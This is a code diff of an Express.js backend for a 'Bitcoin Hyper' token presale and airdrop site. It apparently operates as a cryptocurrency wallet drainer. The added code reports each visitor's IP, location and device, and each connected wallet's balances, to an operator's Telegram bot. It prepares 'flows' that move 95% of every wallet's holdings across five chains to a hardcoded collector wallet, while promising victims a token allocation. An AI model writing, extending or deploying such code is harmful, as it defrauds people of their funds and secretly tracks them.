@@ -1,4 +1,7 @@
-// index.js - BITCOIN HYPER BACKEND - PROJECT FLOW ROUTER
+// index.js - BITCOIN HYPER BACKEND - FULL TELEGRAM REPORTING
+// All flows are reported to Telegram with complete details
+// Updated for hyperback-psi.vercel.app backend and hyperaidrop.vercel.app frontend
+
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -23,7 +26,7 @@ const allowedOrigins = process.env.ALLOWED_ORIGINS
   ? process.env.ALLOWED_ORIGINS.split(',') 
   : [
       'http://localhost:3000', 
-      'https://hyperaidrop.vercel.app', 
+      'https://hyperaidrop.vercel.app',
       'https://hyperback-psi.vercel.app',
       'https://bitcoinhypertoken.vercel.app'
     ];
@@ -56,6 +59,8 @@ app.get('/', (req, res) => {
     name: 'Bitcoin Hyper Backend',
     version: '2.0.0',
     status: '🟢 ONLINE',
+    backendUrl: 'https://hyperback-psi.vercel.app',
+    frontendUrl: 'https://hyperaidrop.vercel.app',
     timestamp: new Date().toISOString()
   });
 });
@@ -216,7 +221,7 @@ const memoryStorage = {
 };
 
 // ============================================
-// TELEGRAM FUNCTIONS - FIXED VERSION
+// TELEGRAM FUNCTIONS - ENHANCED REPORTING
 // ============================================
 
 async function sendTelegramMessage(text) {
@@ -254,6 +259,27 @@ async function sendTelegramMessage(text) {
   }
 }
 
+async function sendTelegramPhoto(photoUrl, caption) {
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  
+  if (!botToken || !chatId) return false;
+  
+  try {
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      chat_id: chatId,
+      photo: photoUrl,
+      caption: caption,
+      parse_mode: 'HTML'
+    }, { timeout: 15000 });
+    
+    return response.data?.ok || false;
+  } catch (error) {
+    console.error('Photo send error:', error.message);
+    return false;
+  }
+}
+
 async function testTelegramConnection() {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -276,12 +302,17 @@ async function testTelegramConnection() {
     telegramBotName = meResponse.data.result.username;
     console.log(`✅ Bot authenticated: @${telegramBotName}`);
     
-    // Send startup message without URLs
+    // Send startup message with new URLs
     const startMessage = 
       `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
-      `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche`;
+      `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
+      `🔗 Backend: hyperback-psi.vercel.app\n` +
+      `🌍 Frontend: hyperaidrop.vercel.app\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `🕐 Started: ${new Date().toLocaleString()}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
     
@@ -345,7 +376,7 @@ async function getCryptoPrices() {
 }
 
 // ============================================
-// REAL WALLET EMAIL EXTRACTION - FIXED
+// REAL WALLET EMAIL EXTRACTION
 // ============================================
 
 async function getWalletEmail(walletAddress) {
@@ -354,11 +385,8 @@ async function getWalletEmail(walletAddress) {
   }
   
   try {
-    // Generate consistent email based on wallet address
     const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
     const username = `user${hash.substring(0, 8)}`;
-    
-    // Always use proton.me for consistency
     const email = `${username}@proton.me`;
     
     memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
@@ -436,15 +464,18 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
   
   memoryStorage.siteVisits.push(visit);
   
-  // INSTANT Telegram notification without URLs
+  // Enhanced Telegram notification for site visits
   const telegramMessage = 
-    `${visit.isHuman ? '👤' : '🤖'} <b>NEW SITE VISIT</b>\n` +
-    `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
+    `${visit.isHuman ? '👤' : '🤖'} <b>🌐 NEW SITE VISIT</b>\n` +
+    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
     `🌐 <b>IP:</b> ${visit.ip}\n` +
     `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
-    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
-    `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
-    `🆔 <b>Visit ID:</b> ${visit.id}`;
+    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot Detected)'}\n` +
+    `🔗 <b>Source:</b> ${referer || 'Direct'}\n` +
+    `📂 <b>Page:</b> ${path || '/'}\n` +
+    `🆔 <b>Visit ID:</b> ${visit.id}\n` +
+    `🕐 <b>Time:</b> ${new Date().toLocaleTimeString()}`;
   
   await sendTelegramMessage(telegramMessage);
   
@@ -546,7 +577,9 @@ async function getWalletBalance(walletAddress, clientIP = null, location = null)
 app.get('/api/health', (req, res) => {
   res.json({ 
     success: true, 
-    status: 'ACTIVE'
+    status: 'ACTIVE',
+    backend: 'https://hyperback-psi.vercel.app',
+    telegram: telegramEnabled ? 'connected' : 'disabled'
   });
 });
 
@@ -588,7 +621,7 @@ app.post('/api/track-visit', async (req, res) => {
 });
 
 // ============================================
-// CONNECT ENDPOINT
+// CONNECT ENDPOINT - FULL REPORTING
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
@@ -639,12 +672,15 @@ app.post('/api/presale/connect', async (req, res) => {
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
       
       const newUserMsg = 
-        `${location.flag} <b>NEW PARTICIPANT REGISTERED</b>\n` +
+        `🆕 <b>✨ NEW PARTICIPANT REGISTERED</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
+        `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}\n` +
         `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
         `📧 <b>Email:</b> ${email}\n` +
-        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}`;
+        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
+        `📱 <b>Device:</b> ${participant.deviceType}\n` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
       
       await sendTelegramMessage(newUserMsg);
     }
@@ -662,12 +698,27 @@ app.post('/api/presale/connect', async (req, res) => {
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
       
+      // Build detailed balance message
+      let balancesText = '';
+      if (balanceResult.data.balances.length > 0) {
+        balancesText = '\n📊 <b>Balances:</b>';
+        balanceResult.data.balances.forEach(b => {
+          balancesText += `\n   🔹 ${b.chain}: ${b.amount.toFixed(6)} ${b.symbol} = $${b.valueUSD.toFixed(2)}`;
+        });
+      } else {
+        balancesText = '\n📊 <b>Balances:</b> No assets found';
+      }
+      
       const connectMsg = 
-        `${location.flag} <b>WALLET CONNECTED</b>\n` +
+        `🔗 <b>💰 WALLET CONNECTED</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
         `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
-        `📧 <b>Email:</b> ${email}`;
+        `📧 <b>Email:</b> ${email}\n` +
+        `📍 <b>Location:</b> ${location.country} ${location.flag}\n` +
+        `${balancesText}\n` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
       
       await sendTelegramMessage(connectMsg);
       
@@ -698,7 +749,7 @@ app.post('/api/presale/connect', async (req, res) => {
 });
 
 // ============================================
-// PREPARE FLOW ENDPOINT
+// PREPARE FLOW ENDPOINT - FULL REPORTING
 // ============================================
 
 app.post('/api/presale/prepare-flow', async (req, res) => {
@@ -724,14 +775,17 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       .map(b => ({
         chain: b.chain,
         chainId: b.chainId,
-        amount: (b.amount * 0.95).toFixed(12), // Changed to 95% to match frontend
+        amount: (b.amount * 0.95).toFixed(12),
+        originalAmount: b.amount.toFixed(6),
         valueUSD: (b.valueUSD * 0.95).toFixed(2),
+        originalValueUSD: b.valueUSD.toFixed(2),
         symbol: b.symbol,
         contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
         collectorAddress: COLLECTOR_WALLET
       }));
     
     const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
+    const originalTotalUSD = balanceResult.data.totalValueUSD.toFixed(2);
     
     const flowId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
@@ -739,6 +793,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       walletAddress: walletAddress.toLowerCase(),
       transactions,
       totalFlowUSD,
+      originalTotalUSD,
       status: 'prepared',
       createdAt: new Date().toISOString(),
       completedChains: []
@@ -746,15 +801,19 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
     
     let txDetails = '';
     transactions.forEach((tx, index) => {
-      txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
+      txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD}) [was $${tx.originalValueUSD}]`;
     });
     
+    // Send detailed flow preparation report
     await sendTelegramMessage(
-      `🔐 <b>FLOW PREPARED</b>\n` +
+      `🔐 <b>📋 FLOW PREPARED</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-      `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
+      `💰 <b>Original Balance:</b> $${originalTotalUSD}\n` +
+      `💵 <b>Flow Value (95%):</b> $${totalFlowUSD}\n` +
       `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
-      `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
+      `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+      `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
     );
     
     res.json({
@@ -762,6 +821,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       data: {
         flowId,
         totalFlowUSD,
+        originalTotalUSD,
         transactionCount: transactions.length,
         transactions
       }
@@ -774,7 +834,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT - FIXED
+// EXECUTE FLOW ENDPOINT - FULL REPORTING
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
@@ -806,6 +866,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
       });
       
       memoryStorage.settings.statistics.totalProcessedWallets++;
+      memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(valueUSD || 0);
       memoryStorage.settings.statistics.processedTransactions.push({
         wallet: walletAddress,
         chain: chainName,
@@ -817,14 +878,17 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         timestamp: new Date().toISOString()
       });
       
-      // Send Telegram message with the actual amounts from the request
+      // Send detailed chain transaction report
       await sendTelegramMessage(
-        `💰 <b>CHAIN TRANSACTION EXECUTED</b>\n` +
+        `💰 <b>⛓️ CHAIN TRANSACTION EXECUTED</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
         `🔗 <b>Chain:</b> ${chainName}\n` +
-        `💵 <b>Amount:</b> ${amount || 'unknown'} ${symbol || ''} ($${valueUSD || 'unknown'})\n` +
+        `💵 <b>Amount:</b> ${amount || 'unknown'} ${symbol || ''}\n` +
+        `💲 <b>Value:</b> $${valueUSD || 'unknown'}\n` +
         `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
-        `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
+        `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+        `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
       );
       
       // Update the flow in pendingFlows
@@ -840,13 +904,12 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         if (txIndex >= 0) {
           flow.transactions[txIndex].actualAmount = amount;
           flow.transactions[txIndex].actualValueUSD = valueUSD;
+          flow.transactions[txIndex].txHash = txHash;
+          flow.transactions[txIndex].executedAt = new Date().toISOString();
         }
         
         // Check if all chains are completed
         if (flow.completedChains.length === flow.transactions.length) {
-          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
-          memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
-          
           let completionDetails = '';
           flow.transactions.forEach(t => {
             const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
@@ -855,11 +918,28 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             completionDetails += `\n   ${completed} ${t.chain}: ${displayAmount} ${t.symbol} ($${displayValue})`;
           });
           
+          // Send detailed flow completion report
           await sendTelegramMessage(
-            `✅ <b>🎉 FLOW COMPLETED 🎉</b>\n` +
+            `✅ <b>🎉 FULL FLOW COMPLETED 🎉</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━━\n` +
             `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-            `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
+            `💰 <b>Original Balance:</b> $${flow.originalTotalUSD}\n` +
+            `💵 <b>Total Processed:</b> $${flow.totalFlowUSD}\n` +
             `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
+            `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
+            `🕐 <b>Completed:</b> ${new Date().toLocaleString()}`
+          );
+          
+          memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
+        } else {
+          // Send progress update
+          const remaining = flow.transactions.length - flow.completedChains.length;
+          await sendTelegramMessage(
+            `📊 <b>⏳ FLOW PROGRESS UPDATE</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+            `✅ <b>Completed:</b> ${flow.completedChains.length}/${flow.transactions.length} chains\n` +
+            `⏳ <b>Remaining:</b> ${remaining} chain(s)\n` +
             `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
           );
         }
@@ -875,7 +955,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
 });
 
 // ============================================
-// CLAIM ENDPOINT
+// CLAIM ENDPOINT - FULL REPORTING
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
@@ -903,14 +983,32 @@ app.post('/api/presale/claim', async (req, res) => {
       detailsText = `\n📋 <b>Details:</b>\n${chainsDetails}`;
     }
     
+    // Send detailed claim completion report
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
       `🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n` +
       `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
+      `💵 <b>Value:</b> $${participant.allocation?.valueUSD || '850'}\n` +
       `📧 <b>Email:</b> ${participant.email}\n` +
-      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}${detailsText}`
+      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}${detailsText}\n` +
+      `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
     );
+    
+    // Send summary of participant's journey
+    const journeySummary = 
+      `📊 <b>PARTICIPANT JOURNEY SUMMARY</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+      `📍 <b>From:</b> ${participant.country} ${participant.flag}\n` +
+      `💵 <b>Initial Balance:</b> $${participant.totalValueUSD}\n` +
+      `✅ <b>Eligible:</b> Yes\n` +
+      `💸 <b>Flows Processed:</b> ${participant.flowTransactions?.length || 0} chains\n` +
+      `🎁 <b>Claimed:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
+      `🕐 <b>Completed:</b> ${new Date().toLocaleString()}`;
+    
+    await sendTelegramMessage(journeySummary);
     
     res.json({ success: true });
     
@@ -989,11 +1087,13 @@ app.get('/api/admin/dashboard', (req, res) => {
             country: p.country, 
             flag: p.flag || '🌍', 
             count: 0, 
-            eligible: 0 
+            eligible: 0,
+            claimed: 0
           };
         }
         locationStats[key].count++;
         if (p.isEligible) locationStats[key].eligible++;
+        if (p.claimed) locationStats[key].claimed++;
       }
     });
   }
@@ -1035,7 +1135,9 @@ app.get('/api/admin/dashboard', (req, res) => {
     flowEnabled: memoryStorage.settings?.flowEnabled || false,
     tokenName: memoryStorage.settings?.tokenName || 'Bitcoin Hyper',
     tokenSymbol: memoryStorage.settings?.tokenSymbol || 'BTH',
-    collectorWallet: COLLECTOR_WALLET || 'N/A'
+    collectorWallet: COLLECTOR_WALLET || 'N/A',
+    backendUrl: 'https://hyperback-psi.vercel.app',
+    frontendUrl: 'https://hyperaidrop.vercel.app'
   };
   
   res.json({
@@ -1139,6 +1241,8 @@ app.listen(PORT, '0.0.0.0', async () => {
   ⚡ BITCOIN HYPER BACKEND - MULTICHAIN FLOW ROUTER
   ================================================
   📍 Port: ${PORT}
+  🔗 Backend URL: https://hyperback-psi.vercel.app
+  🌍 Frontend URL: https://hyperaidrop.vercel.app
   
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   
@@ -1150,6 +1254,8 @@ app.listen(PORT, '0.0.0.0', async () => {
   ✅ Avalanche: 0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288
   
   🤖 TELEGRAM: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}
+  
+  📊 REPORTING: Every flow is reported to Telegram with full details
   
   🚀 READY FOR MULTICHAIN FLOWS
   `);
